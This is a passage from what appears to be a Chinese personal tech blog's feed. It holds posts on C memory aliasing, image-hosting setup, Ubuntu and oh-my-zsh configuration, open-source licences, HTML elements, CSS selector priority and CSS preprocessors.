&lt;__stack_chk_fail@plt&gt;</code></pre></div><p>6eb-700分配数组空间</p><p>700-740 进行数组操作,其中的变量都保存在动态分配的栈中</p><p>744 得到返回结果</p><p>可以看到，该函数最后返回的是一个在该函数内分配的一个值，返回给寄存器后，没有地址的引用，所以可以正确返回。</p><p>我们再来看一个别名的例子,当程序的不同部分指向内存中相同的位置时，这称为别名。别名的使用会影响到程序的优化，以下的代码很好的说明了，别名设置对数组的影响。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">double</span> A[<span class="hljs-number">9</span>] = &#123;    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>,    <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">16</span>,    <span class="hljs-number">32</span>, <span class="hljs-number">64</span>, <span class="hljs-number">128</span>&#125;;<span class="hljs-comment">/*Sum rows is of n X n matrix a and store in vector ba: n*n arrayb: n array n: size*/</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sum_rowsl</span><span class="hljs-params">(<span class="hljs-keyword">double</span> *a, <span class="hljs-keyword">double</span> *b, <span class="hljs-keyword">long</span> n)</span></span>&#123;    <span class="hljs-keyword">long</span> i, j;    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)    &#123;        b[i] = <span class="hljs-number">0</span>;        <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; n; j++)        &#123;            b[i] += a[i * n + j];  <span class="hljs-comment">//          printf("%f\n", b[i]);</span>        &#125;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">double</span> * B = A + <span class="hljs-number">3</span>;    sum_rowsl(A, B, <span class="hljs-number">3</span>);&#125;<span class="hljs-comment">//上述代码在每次i改变后，b的值都会改变，最终B的结果如下</span><span class="hljs-number">32.000000</span><span class="hljs-number">96.000000</span><span class="hljs-number">224.000000</span></code></pre></div><p>这里由于用objdump看结果不直观,我们用cgdb来查看</p><p><img src="https://i.loli.net/2020/07/22/KzQ8WeBZPT1s2DE.png" srcset="/img/loading.gif" alt="image-20200722210210797"></p><p>可以看到,main函数中,A,B,C的地址分别保存在%rdi,%rsi,%rdx中,然后调用sum_rowsl函数</p><p>我们打印一下A中的值.可以看出,A数组和B数组引用了部分相同的内存空间</p><p><img src="https://i.loli.net/2020/07/22/AbpJQXZ3CSV8O42.png" srcset="/img/loading.gif" alt="image-20200722212857390"></p><p>进入sum_rowsl函数后,截取关键代码</p><p>每次计算完b[i]的值后,都要将其写回%r12所指向的内存地址,即该数组中某个值的位置,因为a中也引用了该数组的内容,所以累加的结果不能保存在寄存器中,必须回写,然后每次再调用a的值时,从内存中取出.由于我们一开始的代码A定义的是全局变量,所以这里面没有用到栈,如果定义位局部变量,则会用到栈.上述情况明白后可以自己尝试.</p><p><img src="https://i.loli.net/2020/07/22/eRQmMxz7wsBCgZE.png" srcset="/img/loading.gif" alt="image-20200722213145145"></p><p>关于内存的问题,还有很多,bomblab,cachelab都有关于这方面的知识.</p>]]></content>
    
    
    <categories>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-C -计算机系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图床搭建</title>
    <link href="/2020/07/13/%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/07/13/%E5%9B%BE%E5%BA%8A%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="图床-上传工具-格式转换"><a href="#图床-上传工具-格式转换" class="headerlink" title="图床+上传工具+格式转换"></a>图床+上传工具+格式转换</h1><p>这算是一篇注水文章了，大概讲一下图床搭建和自动化的过程。网上的教程很多，仅供参考，自己尝试后，选择适合自己的方法就好。</p><h2 id="1-图床"><a href="#1-图床" class="headerlink" title="1.图床"></a>1.图床</h2><p>​    国内外的图床网站还是蛮多的，国内的网站如七牛云、阿里云等大公司的产品稳定是不必说，但是搭建起来较为麻烦，要结合picgo的话，还需要配置很多东西，而一些小型网站，配置更方便些，比如只要一个key或者token就可以进行上传。</p><p>​    今天七牛云的实名审核刚下来，就先试了一下该产品的免费服务，选择对象存储后，就可以创建空间了，但是由于其仅提供30天的CDN加速域名服务，而要实现自己域名的绑定还需要对域名进行备案，如此一系列操作下来，也够折腾了。当然，如果选择海外存储的话，就可以绑定非备案域名，然后限制就是国内访问不了。由于以上各种原因，我还是放弃了七牛云，转向了十分简单的SMMS图床。</p><p>​    总的来说，使用图床的目的还是希望能让读者有更好的用户体验，由于我的博客是部署在github上，国内的访问速度本来就不快，才把图片资源放转向了图床服务。除了最基本的目的外，要考虑的就是服务稳定性和价格了。目前先试用着吧，等以后需要扩容再考虑付费的问题。</p><h2 id="2-PicGo"><a href="#2-PicGo" class="headerlink" title="2.PicGo"></a>2.PicGo</h2><p>​    一款开源的简化图片上传工具，内置很多图床的上传接口，当然也可以进行二次开发，搭建自己的图床上传接口。总的来说，这款开源软件的有很高的定制型，加上设置Server后，可以通过其他软件直接调用该软件，把自动化的流程扩大了一步。</p><h2 id="3-Typora"><a href="#3-Typora" class="headerlink" title="3.Typora"></a>3.Typora</h2><p>​    Markdown编辑器，轻量级，所见即所得。最近更新出上传图片的功能，可以将md中的图片自动上传图床后并引用其地址。这也免去了去picgo上传后，再进行复制的步骤。简单截个图，按照如下方法配置即可</p><p><img src="https://i.loli.net/2020/07/13/q8w96KouXcCY7dj.png" srcset="/img/loading.gif" alt="image-20200713204019205"></p><p><img src="https://i.loli.net/2020/07/13/uFjtLZEVfxbk62z.png" srcset="/img/loading.gif" alt="image-20200713204033394"></p><p>配置完这两项后，再md文件中所有的图片嵌入操作都将自动实现网络引用，一来方便了写作，二来部署到博客后，也能提高加载速度。</p><h2 id="4-Snipaste截图"><a href="#4-Snipaste截图" class="headerlink" title="4.Snipaste截图"></a>4.Snipaste截图</h2><p>​    如果还要更进一步，实现截图工具的便利，可以考虑使用snipaste，稍微记一下快捷键操作，就能实现定制化截图。功能很多，方便自己用就行。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>​    前些天修改主题后，读了一下配置文件，本想着就开始写博客，但是考虑到原来遇到的图片加载的问题，就决定把图床实现后在进行写作。这些东西一路查下来，还是能了解很多东西的。当然，写作的目的不能忘，本质还是其内容。这篇文章也仅仅是简单记录一下解决问题的思考，对各种方案的选择。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-图床 -效率</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>修改主题</title>
    <link href="/2020/07/11/%E6%84%9F%E6%83%B3/%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98/"/>
    <url>/2020/07/11/%E6%84%9F%E6%83%B3/%E4%BF%AE%E6%94%B9%E4%B8%BB%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>​    如果世界上有什么乐趣，对我来说，那逛别人的博客一定是算一个，最近写的不多看的到不少，一个个精心维护的博客，便是一个个迷你的世界。程序员的理想，也许就是自己写的博客，能被志同道合的人发现，然后默默关注吧。</p><p>​    最近决定重回写博客之旅，技术有限，很多都是对知识的总结，也算是对自己的复习。总的来说，写一俩篇不难，难的是坚持，倘若坚持个十年半载，也应该能积累很多东西了。</p><p>​    由于本人爱好刷韩剧，就准备放一些背景图上去，包括但不限于韩剧剧照，明星演员等。等后期也打算开个专栏，写一些关于韩剧的看法。</p>]]></content>
    
    
    <categories>
      
      <category>感悟</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-随笔</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux避坑记</title>
    <link href="/2020/03/12/linux/linux%E9%81%BF%E5%9D%91%E8%AE%B0/"/>
    <url>/2020/03/12/linux/linux%E9%81%BF%E5%9D%91%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>故事还要从一次卸载python说起，因为下了ranger的缘故，结果包不识别，一气之下把python给uninstall了，我正为我的操作感到得意之时，一串串的其它包飞速飘过，心里一惊，完蛋了，果然不出所料，电脑重启，然后就是一个黑乎乎的终端。种种原因，我放弃了这个系统，转而下载了一个新的ubuntu，本以为第二次有了经验，结果还是看着教程装，心想这次的教训还是得记着，就写下这篇文章，来比一些坑。</p><h1 id="好戏开始"><a href="#好戏开始" class="headerlink" title="好戏开始"></a>好戏开始</h1><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h2><h3 id="1-1安装时出了receiving-file-并卡住了"><a href="#1-1安装时出了receiving-file-并卡住了" class="headerlink" title="1.1安装时出了receiving file 并卡住了"></a>1.1安装时出了receiving file 并卡住了</h3><p>本以为导入vmware就万事大吉的我，结果发现安装的进度条在那不动了，然后就一顿狂搜。</p><p>得出以下几点结论。网络没有配置，但一开始选了安装时更新系统，这个操作只能说自己太naive了，但如果退回去重装，又太麻烦。然后看见一位热心网友指出，在一个小标那，点击一下，会跳出skip的按钮，试了一下，真的太真实了。终于，跳过了该环节，系统安装好了</p><h3 id="1-2vmtools的安装"><a href="#1-2vmtools的安装" class="headerlink" title="1.2vmtools的安装"></a>1.2vmtools的安装</h3><p>由于刚才的skip跳过，导致vmtools得自己手动安装，结果点开虚拟机项，发现是黑的。后来才知道，由于sata一开始设置的是镜像文件的目录。导致vmware无法与ubuntu的文件系统连接，自然无法将vmtools 传给客户机了，接着一顿设置，解压，安装，解决问题</p><h2 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h2><p>说道配置，网上的某些大神的习惯可以说给了我这个小白上了一课。由于无法操作上一个主机，配置文件也拿不出来了（没有联网，太菜，不会设置，以后学到了来解决），才知道原来可以把自己的配置文件全部上传到远程仓库，需要的时候直接git clone 。可以说时无缝迁移了，以后哪怕拿到新的开发环境，直接clone一下远程，省去了很多的麻烦</p><h3 id="2-1-源的配置"><a href="#2-1-源的配置" class="headerlink" title="2.1 源的配置"></a>2.1 源的配置</h3><p>这条准确来说不算配置，但一个好的下载源，能节约你很多安装的时间。在/etc/apt/source.list文件内，添加国内源  再update一下</p><blockquote><p>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic main restricted universe multiverse<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic main restricted universe multiverse<br>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-updates main restricted universe multiverse<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-updates main restricted universe multiverse<br>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-backports main restricted universe multiverse<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-backports main restricted universe multiverse<br>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-security main restricted universe multiverse<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-security main restricted universe multiverse<br>deb <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-proposed main restricted universe multiverse<br>deb-src <a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/ubuntu/</a> bionic-proposed main restricted universe multiverse</p></blockquote><h3 id="2-2ohmyzsh的配置"><a href="#2-2ohmyzsh的配置" class="headerlink" title="2.2ohmyzsh的配置"></a>2.2ohmyzsh的配置</h3><p>进去第一件事就是操作终端，但没有一个好的shell，肯定不舒服，安装zsh  改变shell为zsh  安装ohmyzsh   但是事情并没有那么简单 。</p><p>看了网上一片大神的文章才知道。 环境变量这个检验真理的标准，活生生的教我做人。</p><p>echo $ZSH 看看你的zsh在哪，是不是当前用户下的根目录，如果不是，那就赶紧改吧。</p><p>当然，那篇博客也描述了一个我没有碰上但未来很可能碰上的问题，那就是系统配置的问题。 由于root和普通用户的不同，如果你在root下装的ohmyzsh， 是安装在/目录下的。当你切换到自己的目录。结果发现shell并没有改变，然后想是不是因为没有只给root安装，但是没给普通用户安装，于是cp一顿操作，结果报错如下</p><blockquote><p>You already have Oh My Zsh installed.<br>You’ll need to remove /root/.oh-my-zsh if you want to re-install.</p></blockquote><p>深刻学习了该博主的指南，总结一下：下载的安装脚本判断$ZSH是否有值，有值，访问其指代的目录文件，没问题则打印你已安装；权限问题访问不了则权限错误；无值，则将相关文件安装在<del>/.oh-my-zsh，并export ZSH=</del>/.oh.-my-zsh。通过su切换用户，环境变量并未随之改变，$ZSH变量为切换前用户的对应值，以切换前用户为root为例，echo $ZSH，显示/root/.oh-my-zsh。加上sudo后，有了访问/前一个用户家目录/.oh-my-zsh目录的权限，访问发现确实存在，就报已安装，需要删除后才能重新安装。</p><p>看到这里，问题迎刃而解了，先把环境切换为自己的环境，然后把ZSH的值修改成空，再次安装，就ok了。 然后再配置一下ohmyzsh，这个在家目录下的.ohmyzsh的文件下配置。</p><h3 id="2-3vim的配置"><a href="#2-3vim的配置" class="headerlink" title="2.3vim的配置"></a>2.3vim的配置</h3><p>vim这个上古神器，可以说让人又爱又恨，然而一个没有配置过的vim难以称得上是一个效率工具，因此，我根据网上的一些配置方案，做了一些自己的配置。但有两点要谨记</p><p><strong>1.不要去随意使用别人的配置，除非你知道这个配置的意义</strong></p><p><strong>2.不要去装现在对你来说没有用的配置</strong></p><p>牢记这两点，我开始了自己的配置之路。安装完vim-plug后，适当的添加自己需要的插件。</p><p>最后，把.vimrc保存，方便以后使用</p><h3 id="2-4-终端的透明化"><a href="#2-4-终端的透明化" class="headerlink" title="2.4 终端的透明化"></a>2.4 终端的透明化</h3><p>点击终端上面的edit，然后preference，进入color就可以修改自己终端的透明度了。</p><p>颜色搭配是一门学问。可以百度一下，看看哪种适合。</p><p>最后 上一张完成的效果图</p><p><img src="https://pic.downk.cc/item/5e6a4595e83c3a1e3a230004.png" srcset="/img/loading.gif" alt="myvim"></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于开源许可证的一些理解</title>
    <link href="/2019/08/17/%E6%9D%82%E9%A1%B9/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/"/>
    <url>/2019/08/17/%E6%9D%82%E9%A1%B9/%E5%85%B3%E4%BA%8E%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%E7%9A%84%E4%B8%80%E4%BA%9B%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1>关于license的粗略介绍</h1>当今各种软件，代码开源，各种各样的协议也非常多，这里简单的介绍一些<p>首先贴一个网址，看看软件开源方面有哪些许可证。</p><p><a href="https://tldrlegal.com/" target="_blank" rel="noopener">软件简明许可证</a></p><p>进入该网站，可查看各种协议，点击进入具体协议后，会列出该协议 能做，禁止做和必须做的三个部分，相当于你的活动范围，边界以及义务。点开fulltext即可查看全文，及具体的协议。</p><p>说到这，联想到一个开源的问题，上网上查了一下 发现 阮一峰的一篇文章，具体解释了当今云服务与开源的冲突，使得协议也变得更加微妙</p><p>这里贴上原链接<a href="http://www.ruanyifeng.com/blog/2019/06/open-database-relicensing.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2019/06/open-database-relicensing.html</a></p><p>说到这，就来说下github上的几种开源许可证</p><p><strong>（1）Affero GPL (AGPL)</strong></p><p>如果云服务（即 SAAS）用到的代码是该许可证，那么云服务的代码也必须开源。</p><p><strong>（2）GPL</strong></p><p>如果项目包含了 GPL 许可证的代码，那么整个项目都必须使用 GPL 许可证。</p><p><strong>（3）LGPL</strong></p><p>如果项目采用动态链接调用该许可证的库，项目可以不用开源。</p><p><strong>（4）Mozilla（MPL）</strong></p><p>只要该许可证的代码在单独的文件中，新增的其他文件可以不用开源。</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-license</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html的一些细节</title>
    <link href="/2019/08/07/%E5%89%8D%E7%AB%AF/html%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/"/>
    <url>/2019/08/07/%E5%89%8D%E7%AB%AF/html%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<h1 id="元素分类"><a href="#元素分类" class="headerlink" title="元素分类"></a>元素分类</h1><h2 id="块级元素和行内元素的区别"><a href="#块级元素和行内元素的区别" class="headerlink" title="块级元素和行内元素的区别"></a>块级元素和行内元素的区别</h2><p>HTML（超文本标记语言）中元素大多数都是块级元素或行内元素。块级元素占据其父元素（容器）的整个空间，因此创建了一个“块”。这篇文章帮助解释这个概念。通常浏览器会在块级元素前后另起一个新行。</p><p>块级元素只能出现在 /<body> 元素内。</body></p><p>块级元素与行内元素有几个关键区别：</p><ul><li><p>格式</p><p>默认情况下，行内元素不会以新行开始，而块级元素会新起一行。</p></li><li><p>内容模型</p><p>一般情况下，行内元素只能包含数据和其他行内元素。</p><p>一般块级元素可以包含行内元素和其他块级元素。这种结构上的包含继承区别可以使块级元素创建比行内元素更”大型“的结构。</p></li></ul><p>HTML 标准中块级元素和行内元素的区别至高出现在 4.01 标准中。在 HTML5，这种区别被一个更复杂的<a href="https://developer.mozilla.org/zh-CN/docs/HTML/Content_categories" target="_blank" rel="noopener">内容类别</a>代替。”块级“类别大致相当于 HTML5 中的<a href="https://developer.mozilla.org/zh-CN/docs/HTML/Content_categories#Flow_content" target="_blank" rel="noopener">流内容</a>类别，而”行内“类别相当于 HTML5 中的<a href="https://developer.mozilla.org/zh-CN/docs/HTML/Content_categories#Phrasing_content" target="_blank" rel="noopener">措辞内容</a>类别，不过除了这两个还有其他类别。</p><p><img src="https://ae01.alicdn.com/kf/H2e5e6ab80b9f4e858d79810cfb0b1dc5Y.jpg" srcset="/img/loading.gif" alt="块级元素表"></p><p><img src="https://ae01.alicdn.com/kf/Hc77a312d54a94fd6804fa3216e88f6940.jpg" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-html</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>css选择器及优先级</title>
    <link href="/2019/08/07/%E5%89%8D%E7%AB%AF/css%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/"/>
    <url>/2019/08/07/%E5%89%8D%E7%AB%AF/css%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<p>CSS<a href="https://developer.mozilla.org/zh-CN/CSS/Pseudo-elements" target="_blank" rel="noopener">伪元素</a><code>::after</code>用来创建一个伪元素，作为已选中元素的最后一个子元素。通常会配合<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/content" target="_blank" rel="noopener"><code>content</code></a>属性来为该元素添加装饰内容。这个虚拟元素默认是行内元素。</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-comment">/*在a元素的内后加一个箭头*/</span><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">::after</span>&#123;<span class="hljs-attribute">content </span>: “→”；&#125;</code></pre></div><p>具体语法格式：</p><div class="hljs"><pre><code class="hljs css">element::after &#123; style properties &#125;  /* CSS3 语法 */</code></pre></div><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/::after" target="_blank" rel="noopener">具体内容可参见官方文档</a></p><p>选择器</p><p>两篇文章</p><p><a href="http://www.ruanyifeng.com/blog/2009/03/css_selectors.html" target="_blank" rel="noopener">廖雪峰的文章</a></p><p><a href="https://www.cnblogs.com/webblog/archive/2009/07/07/1518274.html" target="_blank" rel="noopener">某博主的文章</a></p><p><img src="https://ae01.alicdn.com/kf/Hd3fef6b86fd547b692722e4f1982fa97C.jpg" srcset="/img/loading.gif" alt="具体分析图"></p><p>css样式中！important要慎用，当然有时候需要用它来覆盖全局CSS文件中的内嵌样式即inline style</p><p>许多JavaScript框架和库都添加了内嵌样式。 使用！important与非常有针对性的选择器是一种覆盖这些内嵌样式的方法。</p><p>补充：后代选择器的定位原则<br>在这里介绍一下对于后代选择器，浏览器是如何查找元素的呢？<br><strong>浏览器CSS匹配不是从左到右进行查找，而是从右到左进行查找。</strong><br>比如DIV#divBox p span.red{color:red;}，浏览器的查找顺序如下：先查找html中所有class=’red’的span元素，找到后，再查找其父辈元素中是否有p元素，再判断p的父元素中是否有id为divBox的div元素，如果都存在则匹配上。<strong>浏览器从右到左进行查找的好处是为了尽早过滤掉一些无关的样式规则和元素</strong></p><p><strong>为目标元素直接添加样式，永远比继承样式的优先级高，无视优先级的遗传规则。</strong></p><p>读完后对选择器的类型以及优先级有了明确的认识</p><p>最低级 * 通配符选择器 0-0-0-0</p><p>1级 元素选择器 或称为类型选择器 伪元素  0-0-0-1 </p><p>2级 类选择器 伪类选择器 属性选择器 0-0-1-0</p><p>3级 id选择器 #id   0-1-0-0</p><p>4级 内嵌样式 style  1-0-0-0</p><p>最高级 ！important</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-css</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSS预编译</title>
    <link href="/2019/08/06/%E5%89%8D%E7%AB%AF/css%E9%A2%84%E7%BC%96%E8%AF%91/"/>
    <url>/2019/08/06/%E5%89%8D%E7%AB%AF/css%E9%A2%84%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h1 id="三种css预处理器"><a href="#三种css预处理器" class="headerlink" title="三种css预处理器"></a>三种css预处理器</h1><h2 id="css预处理器的定义及由来"><a href="#css预处理器的定义及由来" class="headerlink" title="css预处理器的定义及由来"></a>css预处理器的定义及由来</h2><p>定义：预编译又称为预处理，是做些代码文本的替换工作处理，条件编译等就是为编译做的预备工作的阶段主要处理#开始的预编译指令预编译指令指示了在程序正式编译前就由编译器进行的操作，可以放在程序中的任何位置。</p><p>由于css的繁重、冗杂样式、加上低复用性，使得css被开发出来 弥补了css的以下缺憾</p><ul><li>语法不够强大  无法嵌套使得模块化开发中需要书写很多重复的选择器</li><li>没有变量和合理的样式复用机制，使得必须以字面量形式重复输出，使难以维护</li></ul><h2 id="三种预处理器的简介"><a href="#三种预处理器的简介" class="headerlink" title="三种预处理器的简介"></a>三种预处理器的简介</h2><p><strong>Sass</strong>：2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和 compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS。<a href="https://link.zhihu.com/?target=http%3A//sass.bootcss.com/docs/sass-reference/" target="_blank" rel="noopener">sass 中文文档</a><a href="https://link.zhihu.com/?target=http%3A//sass.bootcss.com/docs/sass-reference/" target="_blank" rel="noopener">Sass 参考手册</a></p><p><strong>Less</strong>：2009年出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS，其缺点是比起SASS来，可编程功能不够，不过优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。<a href="https://link.zhihu.com/?target=http%3A//less.bootcss.com" target="_blank" rel="noopener">Less 中文文档</a></p><p><strong>Stylus</strong>：2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。<a href="https://link.zhihu.com/?target=http%3A//wiki.jikexueyuan.com/project/harp-doc/Stylus.html" target="_blank" rel="noopener">Stylus 中文文档</a></p><h3 id="sass"><a href="#sass" class="headerlink" title="sass"></a>sass</h3><p>Sass有两种语法，分别以[*.sass]和[*.scss]为拓展名,Sass兼容css，可以省去格式的麻烦，例如</p><div class="hljs"><pre><code class="hljs sass">/*style.sass*/h1  color: #666  background-color: #666</code></pre></div><h3 id="less"><a href="#less" class="headerlink" title="less"></a>less</h3><p>Less 受 Sass 的影响非常大，以「 *.less 」为扩展名，是 sass 之后的又一款优秀的 css 预处理器。其特点包括：</p><ul><li>变量：就像写其他语言一样，免于多处修改。</li><li>混合：<strong>class 之间的轻松引入和继承。</strong></li><li>嵌套：选择器之间的嵌套使你的 less 非常简洁。</li><li>函数&amp;运算：就像 js 一样，对 less 变量的操控更灵活。</li></ul><p>例如：</p><div class="hljs"><pre><code class="hljs css">@base: #f938ab;.box-shadow(@style, @c) when (iscolor(@c)) &#123;  box-shadow:         @style @c;  -webkit-box-shadow: @style @c;  -moz-box-shadow:    @style @c;&#125;.box-shadow(@style, @alpha: 50%) when (isnumber(@alpha)) &#123;  .box-shadow(@style, rgba(0, 0, 0, @alpha));&#125;.box &#123;   color: saturate(@base, 5%);  border-color: lighten(@base, 30%);  div &#123; .box-shadow(0 0 5px, 30%) &#125;&#125;</code></pre></div><h3 id="stylus"><a href="#stylus" class="headerlink" title="stylus"></a>stylus</h3><p>Stylus 是一个高效、动态以及丰富的 CSS 预处理器。它同时支持缩进的和通俗的两种风格的 CSS 语法风格。</p><p>Stylus 扩展名为「 *.styl 」，跟另外两款 css 预处理器相比略显年轻，社区以及推广程度也不及 sass 和 less，但它的一些优秀特性同样令人着迷。</p><p><a href="https://link.zhihu.com/?target=https%3A//tj.github.io/nib/" target="_blank" rel="noopener">Nib</a>是 Stylus 的应用的类库。给你的「 *.styl 」添加 Nib 的最快方式是克隆 Nib 的 Git 版本库并引入，因为有了 Nib，Stylus 的高效性才更为突出。</p><p>容错性好，你可以在一个 Stylus 文件里这样写，且它们都会被编译成标准 css：</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-comment">/*style.styl*/</span><span class="hljs-comment">/*类似于CSS标准语法*/</span><span class="hljs-selector-tag">h1</span> &#123;  <span class="hljs-attribute">color</span>: <span class="hljs-number">#963</span>;  <span class="hljs-attribute">background-color</span>:<span class="hljs-number">#333</span>;&#125;<span class="hljs-comment">/*省略大括号（｛｝）*/</span><span class="hljs-selector-tag">h1</span>   <span class="hljs-selector-tag">color</span>: <span class="hljs-selector-id">#963</span>;  <span class="hljs-selector-tag">background-color</span>: <span class="hljs-selector-id">#333</span>;<span class="hljs-comment">/*省略大括号（｛｝）和分号（;）*/</span><span class="hljs-selector-tag">h1</span>  <span class="hljs-selector-tag">color</span>:<span class="hljs-selector-id">#963</span>  <span class="hljs-selector-tag">background-color</span>:<span class="hljs-selector-id">#333</span></code></pre></div><h2 id="在特性上的异同"><a href="#在特性上的异同" class="headerlink" title="在特性上的异同"></a>在特性上的异同</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><ul><li>Sass声明变量必须是『$』开头，后面紧跟变量名和变量值，而且变量名和变量值需要使用冒号：分隔开。</li><li>Less 声明变量用『@』开头，其余等同 Sass。</li><li>Stylus 中声明变量没有任何限定，结尾的分号可有可无，但变量名和变量值之间必须要有『等号』。但需要注意的是，如果用“@”符号来声明变量，Stylus会进行编译，但不会赋值给变量。就是说，Stylus 不要使用『@』声明变量。Stylus 调用变量的方法和Less、Sass完全相同。</li></ul><h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>css 预编译器把变量赋予作用域，也就是存在生命周期。就像 js 一样，它会先从局部作用域查找变量，依次向上级作用域查找。</p><ul><li>Sass：三者最差，不存在全局变量的概念。也就是说在 Sass 中定义了相同名字的变量时你就要小心了。</li><li>Less：我认为跟 JS 一样，逐级查找，向上冒泡。</li><li>Stylus：完全等同 Less。Stylus 和 Sass 则更倾向于指令式。</li></ul><h3 id="嵌套"><a href="#嵌套" class="headerlink" title="嵌套"></a>嵌套</h3><p>在使用子选择器时，CSS缺乏可视化层次结构。 您必须在单独的行中编写选择器及其组合。 嵌套提供了HTML中的可视化层次结构，并提高了可读性。 在某些情况下，嵌套会导致选择器过大而类似“选择器列车”，因此请明智地使用它。下面为具体实例</p><p><img src="https://ae01.alicdn.com/kf/H040155c5cad5460e98ae836f2081f4abI.jpg" srcset="/img/loading.gif" alt="实例"></p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p><a href="https://www.liaoxuefeng.com/wiki/897692888725344/923030524000032" target="_blank" rel="noopener">对多重继承较为完善的理解</a></p><p><a href="https://zh.wikipedia.org/wiki/%E9%B8%AD%E5%AD%90%E7%B1%BB%E5%9E%8B" target="_blank" rel="noopener">对鸭子类型的理解</a>  此处的对数据类型的理解为：在python中如果你定义了一个字符串 